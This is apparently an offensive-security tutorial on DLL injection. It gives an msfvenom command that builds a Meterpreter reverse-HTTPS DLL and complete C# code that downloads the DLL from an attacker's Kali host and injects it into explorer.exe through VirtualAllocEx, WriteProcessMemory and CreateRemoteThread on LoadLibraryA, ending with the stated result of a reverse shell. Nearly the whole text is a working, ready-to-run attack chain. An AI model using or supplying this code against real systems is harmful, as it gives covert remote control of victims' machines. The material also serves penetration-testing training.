Generating Meterpreter shellcode:

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f dll -o /met.dll

To implement the DLL injection technique, we are going to create a new C# .NET Standard Console app that will fetch our DLL from the attacker's web server. We'll then write the DLL to disk since LoadLibrary only accepts files present on disk.

    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Text;
    
    namespace Inject
    {
        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
    
            static void Main(string[] args)
            {
                ***<comment>Downloading a DLL and writing it to disk<comment>***
                String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                String dllName = dir + "\\met.dll";
    
                WebClient wc = new WebClient();
                wc.DownloadFile("http://<kali ip>/met.dll", dllName);
    
                ***<comment>OpenProcess called on explorer.exe<comment>***
                
                Process[] expProc = Process.GetProcessesByName("explorer");
                int pid = expProc[0].Id;
    
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                
                ***<comment>Allocating and copying the name of the DLL into explorer.exe<comment>***
              
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

                ***<comment>Locating the address of LoadLibraryA<comment>***
                
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                 ***<comment>Creating a remote thread with argument<comment>***
                
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            }
        }
    }


When we compile and execute the completed code, it fetches the Meterpreter DLL from the web server and gives us a reverse shell
